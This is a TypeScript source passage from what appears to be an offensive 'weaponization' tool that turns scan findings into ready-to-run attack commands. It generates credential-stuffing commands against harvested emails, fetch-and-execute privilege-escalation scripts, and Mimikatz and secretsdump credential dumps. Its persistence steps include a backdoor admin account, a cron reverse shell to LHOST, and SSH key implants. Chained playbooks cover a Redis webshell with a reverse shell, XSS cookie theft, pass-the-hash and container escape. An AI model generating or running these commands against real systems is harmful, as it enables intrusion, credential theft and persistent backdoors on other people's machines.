      command:`# Harvested emails:\n${emails.slice(0,8).map(e=>`# ${e}`).join('\n')}\n\n# Credential stuffing:\npython3 credmaster.py -u ${emails[0]} -p /usr/share/wordlists/rockyou.txt --module o365`,
      description:`${emails.length} emails harvested ג€” credential stuffing against O365/VPN/admin portals` })

  // ג”€ג”€ JS Secrets ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  for (const s of scan.jsEndpoints.filter(e => e.type === 'secret' && ['critical','high'].includes(e.severity||'')).slice(0, 10)) {
    const sname = (s.masked || s.match || 'secret').split(':')[0]
    push({ id:`cred-secret-${s.url}-${sname.slice(0,15)}`, vulnName:`Exposed: ${sname}`, host:s.url, severity:toSeverity(s.severity), category:'credential-harvest', tool:'curl',
      command:`curl -s "${s.url}" | grep -oiE '${sname.toLowerCase().replace(/\s/,'[_-]?')}[^"\\x27\\s]{8,}'\n# If AWS key: aws sts get-caller-identity\n# If GitHub token: curl -H "Authorization: token TOKEN" https://api.github.com/user\n# If Stripe key: curl https://api.stripe.com/v1/customers -u TOKEN:`,
      description:`${sname} in JS ג€” directly usable for API/service access`, evidence:s.match||undefined })
  }

  // ג”€ג”€ Post-exploit auto-generation (Fix 4) ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  if (items.some(i => i.category === 'rce')) {
    const isWindows = openPorts.some(p => [3389, 5985, 135, 139].includes(p.port))
    push({ id:`post-exploit-enum-${host}`, vulnName:'Post-Exploit: Privilege Escalation Enum', host, severity:'high', category:'post-exploit', tool:'linpeas',
      command: isWindows
        ? `# WinPEAS ג€” Windows privilege escalation:\npowershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"\n\n# Sherlock for missing patches:\nIEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1'); Find-AllVulns`
        : `# LinPEAS ג€” Linux privilege escalation:\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Or upload and run:\nwget http://LHOST/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee /tmp/lp.txt\n\n# Quick SUID check:\nfind / -perm -4000 -type f 2>/dev/null\n\n# Sudo rights:\nsudo -l`,
      description:'RCE confirmed ג€” enumerate privilege escalation paths' })
    push({ id:`post-exploit-creds-${host}`, vulnName:'Post-Exploit: Credential Dump', host, severity:'high', category:'post-exploit', tool:'mimikatz',
      command: isWindows
        ? `# Mimikatz (dump LSASS creds):\n.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"\n\n# Or remotely:\nimpacket-secretsdump administrator@${host} -hashes :NTLM_HASH\n\n# NTDS dump (domain controller):\nimpacket-secretsdump -just-dc administrator@${host}`
        : `# Dump /etc/shadow:\nsudo cat /etc/shadow\n\n# Find world-readable sensitive files:\nfind / -readable -name "*.conf" -o -name "*.env" -o -name "id_rsa" 2>/dev/null\n\n# Extract from proc (env vars of running processes):\nfor pid in /proc/*/environ; do cat "$pid" 2>/dev/null | tr '\\0' '\\n' | grep -iE 'pass|secret|token|key'; done`,
      description:'RCE confirmed ג€” dump credentials for lateral movement' })
    push({ id:`post-exploit-persist-${host}`, vulnName:'Post-Exploit: Persistence & Lateral Movement', host, severity:'high', category:'post-exploit', tool:'ssh',
      command: isWindows
        ? `# Add admin user:\nnet user attacker P@ssw0rd! /add && net localgroup administrators attacker /add\n\n# Schedule task:\nschtasks /create /tn "Update" /tr "cmd.exe /c powershell -enc BASE64" /sc DAILY /ru SYSTEM\n\n# BloodHound ג€” map path to Domain Admin:\nSharpHound.exe -c All; # upload & analyze in BloodHound`
        : `# SSH persistence:\nmkdir -p ~/.ssh && echo 'YOUR_SSH_PUBKEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys\n\n# Cron backdoor:\necho '* * * * * bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /etc/cron.d/backdoor\n\n# Lateral movement with stolen creds:\nssh -i stolen_key user@INTERNAL_HOST`,
      description:'RCE confirmed ג€” establish persistence and pivot to internal network' })
  }

  return items.sort((a,b) => {
    const sa = a.adjustedSeverity || a.severity
    const sb = b.adjustedSeverity || b.severity
    const rankA = (EXPLOIT_SCORE[a.category] ?? 3) * (5 - (SEV_ORDER[sa] ?? 4))
    const rankB = (EXPLOIT_SCORE[b.category] ?? 3) * (5 - (SEV_ORDER[sb] ?? 4))
    return rankB - rankA
  })
}

// ג”€ג”€ Attack Chain Builder ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€

export function generateAttackChains(scan: ScanResult, items: WeaponizationItem[]): AttackChain[] {
  const chains: AttackChain[] = []
  const openPorts = scan.ports.filter(p => p.state === 'open').map(p => p.port)
  const hasEnv = items.some(i => i.category === 'credential-harvest' && i.vulnName.includes('.env'))
  const hasGit = items.some(i => i.vulnName.toLowerCase().includes('git'))
  const hasRedis = openPorts.includes(6379)
  const hasMySQL = openPorts.includes(3306)
  const hasMSSQL = openPorts.includes(1433)
  const hasRDP = openPorts.includes(3389)
  const hasSMB = openPorts.includes(445)
  const hasDocker = openPorts.includes(2375)
  const hasK8s = openPorts.includes(6443) || openPorts.includes(10250)
  const hasXss = (scan.xssResults||[]).length > 0
  const hasIdor = (scan.idorResults||[]).length > 0
  const hasSecrets = scan.jsEndpoints.filter(e => e.type === 'secret').length > 0
  const hasEmails = scan.osint.filter(o => o.type === 'email').length > 0
  const noSpf = !scan.dns.some(r => r.type === 'TXT' && r.value.includes('v=spf1'))
  const noDmarc = !scan.dns.some(r => r.type === 'DMARC')

  if (hasEnv && (hasMySQL || hasMSSQL))
    chains.push({ id:'chain-env-db', title:'Env ג†’ DB Takeover', severity:'critical', impact:'Full database compromise ג€” all user data, credentials, PII',
      steps:[
        {weaponId:findWeaponId(items,{category:'credential-harvest',name:'.env'},{category:'credential-harvest',name:'env'}),label:'.env File Read',action:'Extract DB_PASSWORD from exposed .env'},
        {weaponId:findWeaponId(items,{category:'sqli',name:'MySQL'},{category:'sqli',name:'MSSQL'},{category:'sqli'}),label:'DB Login',action:`mysql -h ${scan.target} -u root -p [extracted_password]`},
        {weaponId:'',label:'Dump All Data',action:'mysqldump --all-databases > full_dump.sql'},
        {weaponId:'',label:'Hash Cracking',action:'hashcat -m 3200 hashes.txt rockyou.txt'},
      ]})

  if (hasGit && hasSecrets)
    chains.push({ id:'chain-git-secrets', title:'Git Dump ג†’ Credential Harvest', severity:'critical', impact:'Source code access + embedded secrets = complete account compromise',
      steps:[
        {weaponId:findWeaponId(items,{category:'rce',name:'git'},{category:'rce',name:'Git'}),label:'Git Dump',action:'git-dumper https://target/.git ./repo'},
        {weaponId:'',label:'Secret Extraction',action:'grep -rn "password\\|token\\|api_key" ./repo'},
        {weaponId:'',label:'History Search',action:'git log --all --full-history -p | grep -i secret'},
        {weaponId:findWeaponId(items,{category:'credential-harvest',name:'secret'},{category:'credential-harvest',name:'Exposed'}),label:'Credential Reuse',action:'Test extracted credentials across all services found'},
      ]})

  if (hasXss && hasIdor)
    chains.push({ id:'chain-xss-idor', title:'XSS ג†’ Session Hijack ג†’ IDOR Escalation', severity:'critical', impact:'Full account takeover + unauthorized access to all users data',
      steps:[
        {weaponId:findWeaponId(items,{category:'xss',name:'Reflected'},{category:'xss',name:'Stored'},{category:'xss'}),label:'XSS Trigger',action:'Inject cookie-stealing payload in reflected parameter'},
        {weaponId:'',label:'Session Hijack',action:'Receive stolen session cookie at attacker server'},
        {weaponId:findWeaponId(items,{category:'idor'}),label:'IDOR Exploit',action:'Use hijacked session to access other users via IDOR parameter'},
        {weaponId:'',label:'Data Exfil',action:'Enumerate all user IDs and dump records'},
      ]})

  if (hasRedis && scan.http.length > 0)
    chains.push({ id:'chain-redis-rce', title:'Redis ג†’ Webshell ג†’ Full RCE', severity:'critical', impact:'OS-level access on web server ג€” full compromise',
      steps:[
        {weaponId:findWeaponId(items,{category:'rce',name:'Redis'},{category:'rce',name:'redis'}),label:'Redis Access',action:'Connect: redis-cli -h target (no auth)'},
        {weaponId:'',label:'Write Webshell',action:'config set dir /var/www/html && set payload "<?php system($_GET[cmd]); ?>"'},
        {weaponId:'',label:'Trigger Shell',action:`curl https://${scan.target}/shell.php?cmd=id`},
        {weaponId:'',label:'Reverse Shell',action:`curl "https://${scan.target}/shell.php?cmd=bash+-i+>%26+/dev/tcp/LHOST/LPORT+0>%261"`},
      ]})

  if (hasSMB && hasRDP)
    chains.push({ id:'chain-smb-rdp', title:'SMB ג†’ Pass-the-Hash ג†’ RDP', severity:'critical', impact:'Full Windows domain/workstation access',
      steps:[
        {weaponId:findWeaponId(items,{category:'rce',name:'SMB'},{category:'rce',name:'smb'}),label:'SMB Exploit',action:'EternalBlue or null session ג†’ extract NTLM hashes'},
        {weaponId:'',label:'Hash Dump',action:'impacket-secretsdump administrator@target'},
        {weaponId:findWeaponId(items,{category:'brute-force',name:'RDP'},{category:'brute-force',name:'rdp'}),label:'Pass-the-Hash RDP',action:'evil-winrm -i target -H NTLM_HASH or xfreerdp /pth:HASH'},
        {weaponId:'',label:'Domain Escalation',action:'BloodHound ג†’ find path to Domain Admin'},
      ]})

  if (hasDocker || hasK8s)
    chains.push({ id:'chain-container-escape', title:'Container ג†’ Host Escape', severity:'critical', impact:'Full host OS access from container ג€” escape isolation',
      steps:[
        {weaponId:findWeaponId(items,{category:'rce',name:'Docker'},{category:'rce',name:'Kubernetes'}),label:'Container Access',action:hasDocker?'Connect to Docker API':'Exec into pod via Kubelet'},
        {weaponId:'',label:'Privilege Check',action:'Check --privileged flag or hostPID/hostNetwork'},
        {weaponId:'',label:'Host Escape',action:'nsenter -t 1 -m -u -i -n -p -- /bin/bash'},
        {weaponId:'',label:'Persistence',action:'Add SSH key to /host/root/.ssh/authorized_keys'},
      ]})

  if ((noSpf || noDmarc) && hasEmails)
    chains.push({ id:'chain-email-spoof', title:'Email Spoof ג†’ Credential Stuffing ג†’ Account Takeover', severity:'high', impact:'Account takeover via spoofed emails and credential stuffing',
      steps:[
        {weaponId:findWeaponId(items,{category:'credential-harvest',name:'spoofing'},{category:'credential-harvest',name:'SPF'},{category:'credential-harvest',name:'DMARC'}),label:'Email Spoof',action:`Spoof sender from @${scan.target} (no SPF/DMARC)`},
        {weaponId:findWeaponId(items,{category:'credential-harvest',name:'Email'},{category:'credential-harvest',name:'email'}),label:'Credential Stuffing',action:`Target: ${scan.osint.filter(o=>o.type==='email').slice(0,3).map(o=>o.value).join(', ')}`},
        {weaponId:'',label:'Account Takeover',action:'Use valid credentials for VPN/email/admin access'},
      ]})

  return chains
}

// ג”€ג”€ PROOF required per category ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€

export const PROOF: Record<string, string> = {
  rce: 'Run `id` or `whoami` ג€” output must show OS user on the remote host. Screenshot terminal + target URL.',
  sqli: 'Extract DB version string (`SELECT version()`) or a table name. Show data in response. Screenshot request + response in Burp.',
  xss: 'Receive `document.cookie` at your listener server. Screenshot the cookie value OR alert box with victim domain.',
  ssrf: 'Receive DNS/HTTP callback at Burp Collaborator or Interactsh. Screenshot the interaction log with timestamp.',
  lfi: 'Read `/etc/passwd` or `C:\\Windows\\win.ini`. Show file content in the HTTP response body. Screenshot.',
  idor: 'Access another user\'s resource with your own session. Show different user email/ID in response. Screenshot both requests.',
  crlf: 'Inject `Set-Cookie: injected=1` header. Show cookie is set in browser DevTools. Screenshot.',
  'open-redirect': 'Show browser redirecting to `evil.com`. Screenshot the URL bar after the redirect follows.',
  takeover: 'Host custom HTML on the subdomain. Screenshot your content at the target URL.',
  network: 'Banner grab showing version string. Screenshot nmap output with service/version columns.',
  'credential-harvest': 'Login successfully with extracted credentials. Screenshot the authenticated dashboard or session.',
  'auth-bypass': 'Access a protected resource without valid credentials. Screenshot the 200 response with sensitive data.',
  'brute-force': 'Show the valid credential pair. Screenshot the successful login attempt in Hydra/tool output.',
  'post-exploit': 'Screenshot command output on the target system after initial access. Show hostname + whoami.',
  'api-abuse': 'Show API response containing unauthorized data. Screenshot the full response body.',
  'waf-bypass': 'Show payload executing despite WAF. Combine with underlying vulnerability proof.',
  ssti: '`{{7*7}}` must return `49` in the response. For RCE: show output of `id` command. Screenshot.',
  xxe: 'Show `/etc/passwd` content in response, or DNS callback at Burp Collaborator. Screenshot.',
  deserialize: 'Show RCE via command output or OOB DNS callback. Capture the ysoserial payload result.',
  jwt: 'Access an admin endpoint with your forged token. Show elevated privilege in the response body.',
  oauth: 'Receive auth code at your attacker redirect_uri. Screenshot the stolen token/code.',
  'prototype-pollution': 'Show `__proto__` pollution affecting app behavior ג€” e.g., access admin panel. Screenshot.',
  'supply-chain': 'Show your package installed from victim CI/CD. Screenshot the install log.',
  cloud: 'Show IAM credential response or full S3 bucket listing. Screenshot the AWS CLI output.',
  'business-logic': 'Show manipulated price/quantity in the cart. Screenshot the order confirmation with wrong price.',
}

// ג”€ג”€ SOURCES per category ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€

export const SOURCES: Record<string, { name: string; url: string }[]> = {
  rce: [
    { name: 'PayloadAllTheThings', url: 'https://github.com/swisskyrepo/PayloadAllTheThings/tree/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet' },
    { name: 'GTFOBins', url: 'https://gtfobins.github.io/' },
    { name: 'HackTricks RCE', url: 'https://book.hacktricks.xyz/pentesting-web/command-injection' },
    { name: 'ExploitDB', url: 'https://www.exploit-db.com/' },
  ],
  sqli: [
    { name: 'PortSwigger SQLi', url: 'https://portswigger.net/web-security/sql-injection' },
    { name: 'PayloadAllTheThings SQLi', url: 'https://github.com/swisskyrepo/PayloadAllTheThings/tree/master/SQL%20Injection' },
    { name: 'HackTricks SQLi', url: 'https://book.hacktricks.xyz/pentesting-web/sql-injection' },
  ],
  xss: [
    { name: 'PortSwigger XSS', url: 'https://portswigger.net/web-security/cross-site-scripting' },
    { name: 'XSS Cheatsheet', url: 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet' },
    { name: 'PayloadAllTheThings XSS', url: 'https://github.com/swisskyrepo/PayloadAllTheThings/tree/master/XSS%20Injection' },
  ],
  ssrf: [
    { name: 'PortSwigger SSRF', url: 'https://portswigger.net/web-security/ssrf' },
    { name: 'PayloadAllTheThings SSRF', url: 'https://github.com/swisskyrepo/PayloadAllTheThings/tree/master/Server%20Side%20Request%20Forgery' },
    { name: 'HackTricks SSRF', url: 'https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery' },
  ],
  lfi: [
    { name: 'PortSwigger Path Traversal', url: 'https://portswigger.net/web-security/file-path-traversal' },
    { name: 'PayloadAllTheThings LFI', url: 'https://github.com/swisskyrepo/PayloadAllTheThings/tree/master/File%20Inclusion' },
    { name: 'HackTricks LFI', url: 'https://book.hacktricks.xyz/pentesting-web/file-inclusion' },
  ],
  idor: [
    { name: 'PortSwigger IDOR', url: 'https://portswigger.net/web-security/access-control/idor' },
    { name: 'HackTricks IDOR', url: 'https://book.hacktricks.xyz/pentesting-web/idor' },
    { name: 'PayloadAllTheThings IDOR', url: 'https://github.com/swisskyrepo/PayloadAllTheThings/tree/master/Insecure%20Direct%20Object%20References' },
  ],
  'credential-harvest': [
    { name: 'HackTricks Credentials', url: 'https://book.hacktricks.xyz/pentesting-web/login-bypass' },
    { name: 'SecLists Passwords', url: 'https://github.com/danielmiessler/SecLists/tree/master/Passwords' },
    { name: 'CredMaster', url: 'https://github.com/knavesec/CredMaster' },
  ],
  'brute-force': [
    { name: 'HackTricks Brute Force', url: 'https://book.hacktricks.xyz/pentesting-web/brute-force' },
    { name: 'Hydra GitHub', url: 'https://github.com/vanhauser-thc/thc-hydra' },
    { name: 'SecLists', url: 'https://github.com/danielmiessler/SecLists' },
  ],
  ssti: [
    { name: 'PortSwigger SSTI', url: 'https://portswigger.net/web-security/server-side-template-injection' },
    { name: 'PayloadAllTheThings SSTI', url: 'https://github.com/swisskyrepo/PayloadAllTheThings/tree/master/Server%20Side%20Template%20Injection' },
    { name: 'HackTricks SSTI', url: 'https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection' },
  ],
  xxe: [
    { name: 'PortSwigger XXE', url: 'https://portswigger.net/web-security/xxe' },
    { name: 'PayloadAllTheThings XXE', url: 'https://github.com/swisskyrepo/PayloadAllTheThings/tree/master/XXE%20Injection' },
    { name: 'HackTricks XXE', url: 'https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity' },
  ],
  jwt: [
    { name: 'PortSwigger JWT', url: 'https://portswigger.net/web-security/jwt' },
    { name: 'jwt_tool', url: 'https://github.com/ticarpi/jwt_tool' },
    { name: 'HackTricks JWT', url: 'https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens' },
  ],
  oauth: [
    { name: 'PortSwigger OAuth', url: 'https://portswigger.net/web-security/oauth' },
    { name: 'HackTricks OAuth', url: 'https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover' },
  ],
  network: [
    { name: 'HackTricks Network', url: 'https://book.hacktricks.xyz/pentesting/pentesting-network' },
    { name: 'NVD CVE Database', url: 'https://nvd.nist.gov/vuln/search' },
    { name: 'ExploitDB', url: 'https://www.exploit-db.com/' },
  ],
  'api-abuse': [
    { name: 'PortSwigger API', url: 'https://portswigger.net/web-security/api-testing' },
    { name: 'HackTricks API', url: 'https://book.hacktricks.xyz/pentesting-web/api-abuse' },
    { name: 'OWASP API Top 10', url: 'https://owasp.org/www-project-api-security/' },
  ],
  'waf-bypass': [
    { name: 'PayloadAllTheThings WAF', url: 'https://github.com/swisskyrepo/PayloadAllTheThings/tree/master/WAF%20Bypass' },
    { name: 'HackTricks WAF Bypass', url: 'https://book.hacktricks.xyz/pentesting-web/waf-bypass' },
  ],
  'auth-bypass': [
    { name: 'PortSwigger Auth', url: 'https://portswigger.net/web-security/authentication' },
    { name: 'HackTricks Auth Bypass', url: 'https://book.hacktricks.xyz/pentesting-web/login-bypass' },
    { name: 'PayloadAllTheThings Auth', url: 'https://github.com/swisskyrepo/PayloadAllTheThings/tree/master/Authentication%20Bypass' },
  ],
  deserialize: [
    { name: 'PortSwigger Deserialize', url: 'https://portswigger.net/web-security/deserialization' },
    { name: 'ysoserial', url: 'https://github.com/frohoff/ysoserial' },
    { name: 'PayloadAllTheThings', url: 'https://github.com/swisskyrepo/PayloadAllTheThings/tree/master/Insecure%20Deserialization' },
  ],
  cloud: [
    { name: 'HackTricks Cloud', url: 'https://cloud.hacktricks.xyz/' },
    { name: 'AWS CLI Enum', url: 'https://github.com/andresriancho/enumerate-iam' },
    { name: 'lazys3', url: 'https://github.com/nahamsec/lazys3' },
  ],
  takeover: [
    { name: 'can-i-take-over-xyz', url: 'https://github.com/EdOverflow/can-i-take-over-xyz' },
    { name: 'HackTricks Takeover', url: 'https://book.hacktricks.xyz/pentesting-web/domain-subdomain-takeover' },
  ],
  'supply-chain': [
    { name: 'HackTricks Dep Confusion', url: 'https://book.hacktricks.xyz/pentesting-web/dependency-confusion' },
    { name: 'confused tool', url: 'https://github.com/visma-prodsec/confused' },
  ],
  'business-logic': [
    { name: 'PortSwigger Business Logic', url: 'https://portswigger.net/web-security/logic-flaws' },
    { name: 'HackTricks Business Logic', url: 'https://book.hacktricks.xyz/pentesting-web/business-logic-vulnerabilities' },
  ],
  'prototype-pollution': [
    { name: 'PortSwigger PP', url: 'https://portswigger.net/web-security/prototype-pollution' },
    { name: 'PayloadAllTheThings PP', url: 'https://github.com/swisskyrepo/PayloadAllTheThings/tree/master/Prototype%20Pollution' },
  ],
  crlf: [
    { name: 'PortSwigger CRLF', url: 'https://portswigger.net/kb/issues/00200300_http-response-header-injection' },
    { name: 'PayloadAllTheThings CRLF', url: 'https://github.com/swisskyrepo/PayloadAllTheThings/tree/master/CRLF%20Injection' },
  ],
  'open-redirect': [
    { name: 'PortSwigger Open Redirect', url: 'https://portswigger.net/kb/issues/00500100_open-redirection-reflected' },
    { name: 'PayloadAllTheThings', url: 'https://github.com/swisskyrepo/PayloadAllTheThings/tree/master/Open%20Redirect' },
  ],
  'post-exploit': [
    { name: 'GTFOBins', url: 'https://gtfobins.github.io/' },
    { name: 'LOLBAS', url: 'https://lolbas-project.github.io/' },
    { name: 'HackTricks Post Exploit', url: 'https://book.hacktricks.xyz/windows-hardening/post-exploitation' },
  ],
}

// ג”€ג”€ Mission Brief helper ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€

export function getMissionBrief(scan: ScanResult, items: WeaponizationItem[]) {
  const techStack = [...new Set(scan.http.flatMap(h => h.tech || []))]
  const criticalCount = items.filter(i => (i.adjustedSeverity || i.severity) === 'critical').length
  const highCount = items.filter(i => (i.adjustedSeverity || i.severity) === 'high').length
  const secretCount = scan.jsEndpoints.filter(e => e.type === 'secret').length
  const emailCount = scan.osint.filter(o => o.type === 'email').length
  const wafInfo = scan.http.find(h => h.waf)?.waf
  const topCritical = items.filter(i => (i.adjustedSeverity || i.severity) === 'critical').slice(0, 5)
  const dangerPorts = scan.ports.filter(p => p.state === 'open' && [21, 22, 23, 445, 3389, 5900, 6379, 27017, 2375, 6443, 5432, 3306, 9200, 1433].includes(p.port))
  const primaryVector = items[0]
  return { techStack, criticalCount, highCount, secretCount, emailCount, wafInfo, topCritical, dangerPorts, primaryVector }
}
